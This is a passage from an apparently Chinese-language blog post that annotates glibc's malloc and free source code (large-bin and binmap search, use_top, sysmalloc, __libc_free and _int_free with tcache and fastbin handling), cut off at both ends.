selected.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        The bitmap avoids needing to check that most blocks are nonempty.</span><br><span class="hljs-comment">        The particular case of skipping all bins during warm-up phases</span><br><span class="hljs-comment">        when no chunks have been returned yet is faster than it might look.</span><br><span class="hljs-comment">      */</span><br><span class="hljs-comment">//fastbin,smallbin中刚好的--&gt;fastbin合并后+unsortedbin中刚好的--&gt;用nb定位的largebin_idx中不小于的</span><br><span class="hljs-comment">//以上这些全部失败之后进行下面的操作,寻找比当前idx更大的idx</span><br>   ++idx;<span class="hljs-comment">//直接+1</span><br>   bin = bin_at(av, idx);<br><span class="hljs-comment">//使用bitmap能够避免循环判断+1后的idx指向的链表是不是空的</span><br><span class="hljs-comment">//除了mark_bin unmark_bin get_binmap其他binmap函数都不涉及 binmap数组, 只是单纯的移位运算</span><br>   block = idx2block(idx);<span class="hljs-comment">//算出block</span><br>   <span class="hljs-built_in">map</span> = av-&gt;binmap[block];<span class="hljs-comment">//取出map</span><br>   bit = idx2bit(idx);<span class="hljs-comment">//算出该位的bit</span><br><br>   <span class="hljs-keyword">for</span> (;;)<br>   &#123;<span class="hljs-comment">//大循环,找到后 or 没有--&gt;(goto use_top)</span><br>       <span class="hljs-comment">/* Skip rest of block if there are no more set bits in this block.  */</span><br>       <span class="hljs-comment">//Skip rest of block if there are no more set bits in this block.</span><br>       <span class="hljs-keyword">if</span> (bit &gt; <span class="hljs-built_in">map</span> || bit == <span class="hljs-number">0</span>)<br>       &#123;<span class="hljs-comment">//当前bit为0 或者 chunk后面的bit也等于0(bit &gt; map), idx2bit()不可能得到0,应该是循环下面的部分</span><br>           <span class="hljs-keyword">do</span><br>           &#123;<br>               <span class="hljs-keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="hljs-comment">/* out of bins */</span><br>                   <span class="hljs-keyword">goto</span> use_top;<span class="hljs-comment">//没有的话只能够使用top chunk了</span><br>           &#125; <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">map</span> = av-&gt;binmap[block]) == <span class="hljs-number">0</span>);<span class="hljs-comment">//不等零</span><br><br>           bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));<span class="hljs-comment">//取到了更大且非空的bin</span><br>           bit = <span class="hljs-number">1</span>;<br>       &#125;<br><br>       <span class="hljs-comment">/* Advance to bin with set bit. There must be one. */</span><br>       <span class="hljs-comment">//1.没有经过上面的if,原map中就大于等于bit, 从原bit位开始左移</span><br>       <span class="hljs-comment">//2.经过了上面的if,bit从最低位开始左移</span><br>       <span class="hljs-comment">//从bit位开始找bin header, 肯定是存在的</span><br>       <span class="hljs-keyword">while</span> ((bit &amp; <span class="hljs-built_in">map</span>) == <span class="hljs-number">0</span>)<br>       &#123;<br>           bin = next_bin(bin);<br>           bit &lt;&lt;= <span class="hljs-number">1</span>;<br>           assert(bit != <span class="hljs-number">0</span>);<br>       &#125;<br><br>       <span class="hljs-comment">/* Inspect the bin. It is likely to be non-empty */</span><br>       <span class="hljs-comment">//既然比nb都大, 就选一个最右边的, 这样在largebin中还是最小的</span><br>       victim = last(bin);<br><br>       <span class="hljs-comment">/*  If a false alarm (empty bin), clear the bit. */</span><br>       <span class="hljs-comment">// 如果victim=bin，那么我们就将map对应的位清0，然后获取下一个bin</span><br>       <span class="hljs-comment">// 这种情况发生的概率应该很小。</span><br>       <span class="hljs-keyword">if</span> (victim == bin)<br>       &#123;<br>           av-&gt;binmap[block] = <span class="hljs-built_in">map</span> &amp;= ~bit; <span class="hljs-comment">/* Write through */</span><br>           bin = next_bin(bin);<br>           bit &lt;&lt;= <span class="hljs-number">1</span>;<br>       &#125;<br>       <span class="hljs-keyword">else</span><br>       &#123;<br>           size = chunksize(victim);<br><br>           <span class="hljs-comment">/*  We know the first chunk in this bin is big enough to use. */</span><br>           assert((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb));<br>           <br>           remainder_size = size - nb;<br><br>           <span class="hljs-comment">/* unlink */</span><br>           unlink(av, victim, bck, fwd);<br><br>           <span class="hljs-comment">/* Exhaust */</span><br>           <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>           &#123;<span class="hljs-comment">//不够就整块送出去</span><br>               set_inuse_bit_at_offset(victim, size);<br>               <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                   set_non_main_arena(victim);<br>           &#125;<br>           <span class="hljs-comment">/* Split */</span><br>           <span class="hljs-keyword">else</span><br>           &#123;<span class="hljs-comment">//够了就分割</span><br>               remainder = chunk_at_offset(victim, nb);<br><br>               <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                    have to perform a complete insert here.  */</span><br>               bck = unsorted_chunks(av);<br>               fwd = bck-&gt;fd;<br>               <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))<br>               &#123;<br>                   errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;<br>                   <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br>               remainder-&gt;bk = bck;<br>               remainder-&gt;fd = fwd;<br>               bck-&gt;fd = remainder;<br>               fwd-&gt;bk = remainder;<br><br>               <span class="hljs-comment">/* advertise as last remainder */</span><br>               <span class="hljs-comment">// 如果在small bin范围内，就将其标记为remainder</span><br>               <span class="hljs-keyword">if</span> (in_smallbin_range(nb))<br>                   av-&gt;last_remainder = remainder;<br>               <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size))<br>               &#123;<br>                   remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                   remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>               &#125;<br>               set_head(victim, nb | PREV_INUSE |<br>                                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>               set_head(remainder, remainder_size | PREV_INUSE);<br>               set_foot(remainder, remainder_size);<br>           &#125;<br>           <span class="hljs-comment">//详细的检查, 只有在MALLOC_DEBUG为1时启用</span><br>           check_malloced_chunk(av, victim, nb);<br>           <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>           alloc_perturb(p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>       &#125;<br>   &#125;<br></code></pre></div></td></tr></table></figure><h3 id="use-top"><a href="#use-top" class="headerlink" title="use_top"></a>use_top</h3><p>万策尽了, 使用top chunk. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">use_top:<br>    <span class="hljs-comment">/*   没看懂写了啥(replenished,fenceposts)</span><br><span class="hljs-comment">         If large enough, split off the chunk bordering the end of memory</span><br><span class="hljs-comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span><br><span class="hljs-comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span><br><span class="hljs-comment">         less well fitting) than any other available chunk since it can</span><br><span class="hljs-comment">         be extended to be as large as necessary (up to system</span><br><span class="hljs-comment">         limitations).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span><br><span class="hljs-comment">         MINSIZE) after initialization, so if it would otherwise be</span><br><span class="hljs-comment">         exhausted by current request, it is replenished. (The main</span><br><span class="hljs-comment">         reason for ensuring it exists is that we may need MINSIZE space</span><br><span class="hljs-comment">         to put in fenceposts in sysmalloc.)</span><br><span class="hljs-comment">       */</span><br><br>    victim = av-&gt;top;<br>    size = chunksize(victim);<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb + MINSIZE))<br>    &#123;<span class="hljs-comment">//如果top足够大, 就分割</span><br>        remainder_size = size - nb;<br>        remainder = chunk_at_offset(victim, nb);<br>        av-&gt;top = remainder;<br>        set_head(victim, nb | PREV_INUSE |<br>                             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>        set_head(remainder, remainder_size | PREV_INUSE);<br><span class="hljs-comment">//详细的检查, 只有在MALLOC_DEBUG为1时启用</span><br>        check_malloced_chunk(av, victim, nb);<br>        <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>        alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>    <span class="hljs-comment">/* When we are using atomic ops to free fast chunks we can get</span><br><span class="hljs-comment">         here for all block sizes.  */</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>    &#123;<span class="hljs-comment">//如果不够大且当前arena有fastchunk, 再次malloc_consolidate()等待下一次循环是否可行</span><br>        malloc_consolidate(av);<br>        <span class="hljs-comment">/* restore original bin index */</span><br>        <span class="hljs-keyword">if</span> (in_smallbin_range(nb))<br>            idx = smallbin_index(nb);<br>        <span class="hljs-keyword">else</span><br>            idx = largebin_index(nb);<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">         Otherwise, relay to handle system-dependent cases</span><br><span class="hljs-comment">       */</span><br>    <span class="hljs-keyword">else</span><br>    &#123;<span class="hljs-comment">//啥都没有, 直接sysmalloc()增加topchunk,并且return跳出循环</span><br>        <span class="hljs-keyword">void</span> *p = sysmalloc(nb, av);<br>        <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>            alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="补充-更大的内存分配–sysmalloc"><a href="#补充-更大的内存分配–sysmalloc" class="headerlink" title="补充: 更大的内存分配–sysmalloc"></a>补充: 更大的内存分配–sysmalloc</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   sysmalloc handles malloc cases requiring more memory from the system.</span><br><span class="hljs-comment">   On entry, it is assumed that av-&gt;top does not have enough</span><br><span class="hljs-comment">   space to service request for nb bytes, thus requiring that av-&gt;top</span><br><span class="hljs-comment">   be **extended** or **replaced**.</span><br><span class="hljs-comment"> */</span><br></code></pre></div></td></tr></table></figure><h4 id="第一种情况-使用mmap"><a href="#第一种情况-使用mmap" class="headerlink" title="第一种情况: 使用mmap"></a>第一种情况: 使用mmap</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If have mmap, and the request size meets the mmap threshold, and</span><br><span class="hljs-comment">   the system supports mmap, and there are few enough currently</span><br><span class="hljs-comment">   allocated mmapped regions, try to directly map this request</span><br><span class="hljs-comment">   rather than expanding top.</span><br><span class="hljs-comment"> */</span><br></code></pre></div></td></tr></table></figure><p>主要是根据mp_里的mmap控制变量来决定是否使用mmap. </p><p>因为mmap的chunk没有下一个chunk的prevsize可以使用, 所以overhead还要加上一个size_t, 然后最终大小再和pageSize对齐.</p><p>然后进行一些检查和mp_参数的更新, 返回可用的chunk.</p><h4 id="第二种-替换或拓展top"><a href="#第二种-替换或拓展top" class="headerlink" title="第二种: 替换或拓展top"></a>第二种: 替换或拓展top</h4><p>这种方法用到了其他线程的arena和morecore之类的macro, 看不懂先跳过了. </p><h1 id="释放内存块"><a href="#释放内存块" class="headerlink" title="释放内存块"></a>释放内存块</h1><h2 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __libc_free(<span class="hljs-keyword">void</span> *mem) &#123;<br>    mstate    ar_ptr;<br>    mchunkptr p; <span class="hljs-comment">/* chunk corresponding to mem */</span><br>    <span class="hljs-comment">// 判断是否有钩子函数 __free_hook</span><br>    <span class="hljs-keyword">void</span> (*hook)(<span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) = atomic_forced_read(__free_hook);<br>    <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;<br>        (*hook)(mem, RETURN_ADDRESS(<span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// free NULL没有作用</span><br>    <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>) <span class="hljs-comment">/* free(0) has no effect */</span><br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 将mem转换为chunk状态</span><br>    p = mem2chunk(mem);<br>    <span class="hljs-comment">// 如果该块内存是mmap得到的</span><br>    <span class="hljs-keyword">if</span> (chunk_is_mmapped(p)) <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>        <span class="hljs-comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span><br><span class="hljs-comment">       Dumped fake mmapped chunks do not affect the threshold.  */</span><br>        <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask(p) &gt; mp_.mmap_threshold &amp;&amp;<br>            chunksize_nomask(p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp;<br>            !DUMPED_MAIN_ARENA_CHUNK(p)) &#123;<br>            mp_.mmap_threshold = chunksize(p);<br>            mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>            LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                       mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>        munmap_chunk(p);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    MAYBE_INIT_TCACHE (); <span class="hljs-comment">//唯一的tcache</span><br>    <br>    <span class="hljs-comment">// 根据chunk获得分配区的指针</span><br>    ar_ptr = arena_for_chunk(p);<br>    <span class="hljs-comment">// 执行释放</span><br>    _int_free(ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><h3 id="变量定义-1"><a href="#变量定义-1" class="headerlink" title="变量定义"></a>变量定义</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-keyword">int</span> have_lock)<br>&#123;<br>  INTERNAL_SIZE_T size;        <span class="hljs-comment">/* its size */</span><br>  mfastbinptr *fb;             <span class="hljs-comment">/* associated fastbin */</span><br>  mchunkptr nextchunk;         <span class="hljs-comment">/* next contiguous chunk */</span><br>  INTERNAL_SIZE_T nextsize;    <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-keyword">int</span> nextinuse;               <span class="hljs-comment">/* true if nextchunk is used */</span><br>  INTERNAL_SIZE_T prevsize;    <span class="hljs-comment">/* size of previous contiguous chunk */</span><br>  mchunkptr bck;               <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr fwd;               <span class="hljs-comment">/* misc temp for linking */</span><br><br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">int</span> locked = <span class="hljs-number">0</span>;<br><br>  size = chunksize (p);<br></code></pre></div></td></tr></table></figure><h3 id="小检查-amp-tcache"><a href="#小检查-amp-tcache" class="headerlink" title="小检查 &amp; tcache"></a>小检查 &amp; tcache</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-comment">/* Little security check which won&#x27;t hurt performance: the</span><br><span class="hljs-comment">       allocator never wrapps around at the end of the address space.</span><br><span class="hljs-comment">       Therefore we can exclude some size values which might appear</span><br><span class="hljs-comment">       here by accident or by &quot;design&quot; from some intruder.  */</span><br>    <span class="hljs-comment">// 指针不能指向非法的地址, 必须小于等于-size，为什么？？？</span><br>    <span class="hljs-comment">// 指针必须得对齐，2*SIZE_SZ 这个对齐</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect((<span class="hljs-keyword">uintptr_t</span>) p &gt; (<span class="hljs-keyword">uintptr_t</span>) -size, <span class="hljs-number">0</span>) ||<br>        __builtin_expect(misaligned_chunk(p), <span class="hljs-number">0</span>)) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>    errout:<br>        <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked) __libc_lock_unlock(av-&gt;mutex);<br>        malloc_printerr(check_action, errstr, chunk2mem(p), av);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span><br><span class="hljs-comment">       multiple of MALLOC_ALIGNMENT.  */</span><br>    <span class="hljs-comment">// 大小没有最小的chunk大，或者说，大小不是MALLOC_ALIGNMENT的整数倍</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size))) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    <span class="hljs-comment">// 检查该chunk是否处于使用状态，非调试状态下没有作用</span><br>    check_inuse_chunk(av, p);<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (size);<br><br>    <span class="hljs-keyword">if</span> (tcache<br>&amp;&amp; tc_idx &lt; mp_.tcache_bins<br>&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>      &#123;<br>tcache_put (p, tc_idx);<br><span class="hljs-keyword">return</span>;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure><p>其中</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Check if m has acceptable alignment */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> aligned_OK(m) (((unsigned long) (m) &amp;MALLOC_ALIGN_MASK) == 0)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> misaligned_chunk(p)                                                    \</span><br><span class="hljs-meta">    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &amp;       \</span><br><span class="hljs-meta">     MALLOC_ALIGN_MASK)</span><br></code></pre></div></td></tr></table></figure><h3 id="on-fastbin"><a href="#on-fastbin" class="headerlink" title="on fastbin"></a>on fastbin</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        If eligible, place chunk on a fastbin so it can be found</span><br><span class="hljs-comment">        and used quickly in malloc.</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(get_max_fast())<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> TRIM_FASTBINS</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">        bordering top into fastbins </span><br><span class="hljs-comment">        */</span><br>        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top) <span class="hljs-comment">//这个宏是在if语句里加上一条,意义是p不和top chunk相邻</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    )<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) || <br>            __builtin_expect(chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>        &#123;<br>            <span class="hljs-comment">/* We might not have a lock at this point and concurrent modifications</span><br><span class="hljs-comment">        of system_mem might have let to a false positive.  Redo the test</span><br><span class="hljs-comment">        after getting the lock.  */</span><br>            <span class="hljs-keyword">if</span> (have_lock || (<br>                                &#123;<br>                                    assert(locked == <span class="hljs-number">0</span>);<br>                                    __libc_lock_lock(av-&gt;mutex);<br>                                    locked = <span class="hljs-number">1</span>;<br>                                    chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="hljs-number">2</span> * SIZE_SZ || <br>                                    chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;<br>                                &#125;))<br>            &#123;<br>                errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>                <span class="hljs-keyword">goto</span> errout;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!have_lock)<br>            &#123;<br>                __libc_lock_unlock(av-&gt;mutex);<br>                locked = <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 将chunk的mem部分全部设置为perturb_byte</span><br>        free_perturb(chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br>        <span class="hljs-comment">// 设置fast chunk的标记位</span><br>        set_fastchunks(av);<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> idx = fastbin_index(size);<br>        fb = &amp;fastbin(av, idx); <span class="hljs-comment">//取出fastbin头指针</span><br><br>        <span class="hljs-comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span><br>        <span class="hljs-comment">//多线程相关, 跳过</span><br>        mchunkptr old = *fb, old2;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> old_idx = ~<span class="hljs-number">0u</span>; <span class="hljs-comment">//不就是 1 吗?</span><br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to add</span><br><span class="hljs-comment">        (i.e., double free).  */</span><br>            <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>))<br>            &#123; <span class="hljs-comment">//防止对 fast bin double free</span><br>                errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>                <span class="hljs-keyword">goto</span> errout;<br>            &#125;<br>            <span class="hljs-comment">/* Check that size of fastbin chunk at the top is the same as</span><br><span class="hljs-comment">        size of the chunk that we are adding.  We can dereference OLD</span><br><span class="hljs-comment">        only if we have the lock, otherwise it might have already been</span><br><span class="hljs-comment">        deallocated.  See use of OLD_IDX below for the actual check.  */</span><br>            <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>                old_idx = fastbin_index(chunksize(old));<br>            p-&gt;fd = old2 = old;<br>        &#125; <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);<br><br>        <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect(old_idx != idx, <span class="hljs-number">0</span>))<br>        &#123;<br>            errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br>            <span class="hljs-keyword">goto</span> errout;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h3 id="合并非-mmap-的空闲-chunk"><a href="#合并非-mmap-的空闲-chunk" class="headerlink" title="合并非 mmap 的空闲 chunk"></a>合并非 mmap 的空闲 chunk</h3><p><strong>只有不是 fast bin 的情况下才会触发 unlink</strong> </p><p>首先我们先说一下为什么会合并 chunk，这是为了避免 heap 